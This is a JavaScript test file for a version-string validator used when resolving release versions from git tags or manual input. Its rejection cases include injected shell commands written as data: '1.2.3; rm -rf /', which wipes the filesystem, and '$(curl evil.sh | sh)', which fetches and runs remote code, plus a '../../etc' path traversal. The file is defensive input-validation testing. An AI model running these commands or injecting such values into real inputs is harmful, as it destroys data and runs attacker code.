import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isValidShellVersion, resolveShellVersion, assertValidShellVersion } from './shell-version.mjs';

test('isValidShellVersion accepts a plain semver-shaped version', () => {
  assert.equal(isValidShellVersion('1.2.3'), true);
});

test('isValidShellVersion accepts a prerelease suffix', () => {
  assert.equal(isValidShellVersion('2026.11.20-test4'), true);
});

test('isValidShellVersion rejects a path-traversal attempt', () => {
  assert.equal(isValidShellVersion('../../etc'), false);
});

test('isValidShellVersion rejects shell metacharacters', () => {
  assert.equal(isValidShellVersion('1.2.3; rm -rf /'), false);
  assert.equal(isValidShellVersion('$(curl evil.sh | sh)'), false);
});

test('isValidShellVersion rejects a missing patch component', () => {
  assert.equal(isValidShellVersion('1.2'), false);
});

test('isValidShellVersion rejects an empty string', () => {
  assert.equal(isValidShellVersion(''), false);
});

test('resolveShellVersion derives the version from a shell-v* tag ref', () => {
  const version = resolveShellVersion({ githubRef: 'refs/tags/shell-v1.2.3', inputVersion: undefined });
  assert.equal(version, '1.2.3');
});

test('resolveShellVersion prefers the tag over inputVersion when both are present', () => {
  const version = resolveShellVersion({ githubRef: 'refs/tags/shell-v1.2.3', inputVersion: '9.9.9' });
  assert.equal(version, '1.2.3');
});

test('resolveShellVersion falls back to inputVersion for a non-tag ref', () => {
  const version = resolveShellVersion({ githubRef: 'refs/heads/stage-3', inputVersion: '1.2.3' });
  assert.equal(version, '1.2.3');
});

test('resolveShellVersion throws when neither a tag nor inputVersion is present', () => {
  assert.throws(() => resolveShellVersion({ githubRef: 'refs/heads/stage-3', inputVersion: undefined }));
});

test('resolveShellVersion throws on an invalid tag-derived version rather than silently accepting it', () => {
  assert.throws(() => resolveShellVersion({ githubRef: 'refs/tags/shell-v../../etc', inputVersion: undefined }));
});

test('resolveShellVersion throws on an invalid manual input', () => {
  assert.throws(() => resolveShellVersion({ githubRef: 'refs/heads/stage-3', inputVersion: '1.2.3; rm -rf /' }));
});

test('assertValidShellVersion does not throw for a valid version', () => {
  assert.doesNotThrow(() => assertValidShellVersion('1.2.3'));
});

test('assertValidShellVersion throws for an invalid version', () => {
  assert.throws(() => assertValidShellVersion('not-a-version'));
});
